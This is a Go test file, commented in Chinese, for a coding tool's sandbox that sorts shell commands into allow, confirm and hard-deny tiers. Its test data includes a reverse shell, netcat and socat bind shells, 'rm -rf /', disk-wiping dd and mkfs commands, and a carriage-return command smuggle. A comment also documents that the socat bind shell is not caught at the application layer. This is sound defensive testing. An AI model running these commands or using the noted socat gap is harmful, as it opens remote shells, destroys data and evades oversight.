package tools

// 分档表的直接判据（走 `sandbox.Classify` —— 分档的唯一对外出口）。
//
// 与 .go 的分工：
// - 那个文件从**生产入口**（ExecuteWithConfirm）验"批准真的生效"；
// - 本文件验**档位表本身**：每条规则落在哪一档、以及"不得被放宽"的那些
// （反向 shell / 监听态 / 裸回车 / 越界写之外的写设备）确实是硬拒。
//
// 判别性（A/B）：把 tierForRule 里任一条改成 TierConfirm，对应行立刻红；
// 把 hardenNoApprovableEscape 删掉，`nc -l 4444` 一行立刻红
//（它正是"分档把逃逸载体变成可批准"的那个反例）。

import (
	"testing"

	"github.com/anchorandfish/whale-code/internal/sandbox"
)

func TestN122_TierTable(t *testing.T) {
	workDir := t.TempDir()
	sbx := sandbox.NewSandbox(workDir)
	sbx.SetEnabled(true)

	cases := []struct {
		name string
		cmd  string
		want sandbox.VerdictTier
	}{
		// ── 放行档 ──────────────────────────────────────────────
		{"只读命令", "ls -la", sandbox.TierAllow},
		{"参数位含 deny 词", "grep -rn rm .", sandbox.TierAllow},
		// ★ 残留修复：执行型替换按内层递归判定 ——
		// 良性内层放行（原先"见 $($ 就弹框"正是 I-13.10 真机复跑未过的根因）。
		{"命令替换·良性内层()", `echo "tick $(date)"`, sandbox.TierAllow},
		{"反引号·良性内层()", "echo `date`", sandbox.TierAllow},

		// ── 可批准档：日常可逆，用户点一下就能过 ─────────────────
		{"参数展开 ${...}( 刻意不动)", "echo ${HOME}", sandbox.TierConfirm},
		{"IFS 注入", "IFS=:; echo tick", sandbox.TierConfirm},
		{"chmod", "chmod +x run.sh", sandbox.TierConfirm},
		{"chown", "chown user file.txt", sandbox.TierConfirm},
		{"curl", "curl https://example.com", sandbox.TierConfirm},
		{"wget", "wget https://example.com/x.tgz", sandbox.TierConfirm},
		{"越界写重定向", "echo x > ../../outside.txt", sandbox.TierConfirm},

		// ── 可批准档（2026-10-14：rm 从硬拒降为可批准，对齐 同类 CLI"宁可问不禁"）──
		{"rm 普通目标", "rm -rf /tmp/whale-n122-junk", sandbox.TierConfirm},

		// ── 硬拒档：真不可逆 ────────────────────────────────────
		{"rm 灾难形态(根目录)", "rm -rf /", sandbox.TierHardDeny},
		{"rm 灾难形态($HOME)", "rm -rf $HOME/tmp", sandbox.TierHardDeny},
		{"dd", "dd if=/dev/zero of=/tmp/x bs=1 count=0", sandbox.TierHardDeny},
		{"mkfs", "mkfs -t ext4 /dev/sdb", sandbox.TierHardDeny},
		{"format", "format c:", sandbox.TierHardDeny},

		// ── 硬拒档：替换族按"直接执行同一标准"上浮（残留修复）──
		{"替换·内层危险(rm -rf /)", `echo $(rm -rf /)`, sandbox.TierHardDeny},
		{"替换·不配对(fail-closed)", `echo $(unclosed`, sandbox.TierHardDeny},

		// ── 硬拒档：逃逸载体 / 终端注入（收窄后置条件覆盖）──
		{"反向 shell", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", sandbox.TierHardDeny},
		{"监听态 nc -l", "nc -l 4444", sandbox.TierHardDeny},
		{"裸回车", "echo a\rrm -rf /tmp/x", sandbox.TierHardDeny},

		// ── ★ 既有缺口（**非**本次引入，如实钉住以免被当成已覆盖）────────
		//
		// `socat TCP-LISTEN:...` 在**应用层**是放行档：`socat` 不在 deny 名单、
		// 也不在 `checkNetworkCommand` 的 directNetCmds 名单里（该名单只有
		// nc/ncat/netcat/ssh/scp/sftp/telnet/ftp/curl/wget/rsync），
		// 而 ⑤-b 的 `ShouldBlockByNetworkMode(result, "host")` 对 Inbound（High）
		// 在 host 姿态下返回 false（`network_detect.go:189-205`）。
		// ⇒ 它今天只被 **OS 层** `(deny network*)` 拦，应用层不拦也不再"询问"。
		// 本行把它**显式钉成 TierAllow**：分档表若哪天把它变成硬拒/可批准，
		// 说明有人动了 directNetCmds 或 ⑤-b，须回来重审这条注释。
		{"监听态 socat（既有缺口·仅 OS 层拦）", "socat TCP-LISTEN:4444,fork EXEC:/bin/sh", sandbox.TierAllow},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, rule, hit := sbx.Classify(tc.cmd)
			if got != tc.want {
				t.Fatalf("档位 = %s, want %s（rule=%s hit=%q）\n  cmd=%q",
					got, tc.want, rule, hit, tc.cmd)
			}
			if tc.want == sandbox.TierAllow && rule != "" {
				t.Errorf("放行档不该报出规则名，got %q", rule)
			}
			if tc.want != sandbox.TierAllow && rule == "" {
				t.Errorf("非放行档必须给出结构化规则名（R4：不得由散文反推），got 空")
			}
		})
	}
}

// TestN122_SanctionOnlyOverridesConfirmTier 钉住"批准不是万能钥匙"的**单点判据**。
//
// 直接调 `ValidateSanctioned`：sanctioned=true 只应放行可批准档；
// 硬拒档必须**照样拒绝** —— 否则执行链的纵深防御（bash.go 里那道
// "标记泄漏也拦硬拒档"的复检）就是空话。
func TestN122_SanctionOnlyOverridesConfirmTier(t *testing.T) {
	workDir := t.TempDir()
	sbx := sandbox.NewSandbox(workDir)
	sbx.SetEnabled(true)

	// 可批准档：sanctioned=true ⇒ 放行。
	// （样本 2026-10-08 换为 IFS 形态： 后 `$(date)` 良性内层落放行档，
	// 不再是"可批准档"样本；见 TestW044 判据文件的同款选型说明。）
	const confirmCmd = `IFS=:; echo tick`
	if ok, reason := sbx.ValidateSanctioned(confirmCmd, true); !ok {
		t.Fatalf("可批准档在 sanctioned=true 下应放行，实际拒绝：%s", reason)
	}
	// 可批准档：sanctioned=false ⇒ 照旧拒绝（没有确认流程的路径必须 fail-closed）。
	if ok, _ := sbx.ValidateSanctioned(confirmCmd, false); ok {
		t.Fatal("sanctioned=false 时不得放行可批准档（fail-closed）")
	}
	// 硬拒档：即使 sanctioned=true 也必须拒绝。
	// （：rm 普通目标已降可批准档，硬拒代表样本换为 dd + rm 灾难形态。）
	for _, cmd := range []string{
		"dd if=/dev/zero of=/tmp/whale-n122-junk bs=1 count=1",
		"rm -rf /",
		"nc -l 4444",
		"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
	} {
		if ok, _ := sbx.ValidateSanctioned(cmd, true); ok {
			t.Fatalf("硬拒档不得被 sanctioned=true 放行：%q", cmd)
		}
	}
	// 与 Validate 的口径一致性：Validate 对可批准档也必须拒绝（历史契约未变）。
	if ok, _ := sbx.Validate(confirmCmd); ok {
		t.Fatal("Validate 的历史契约必须保持：可批准档在非批准路径上仍为『不允许』")
	}
}
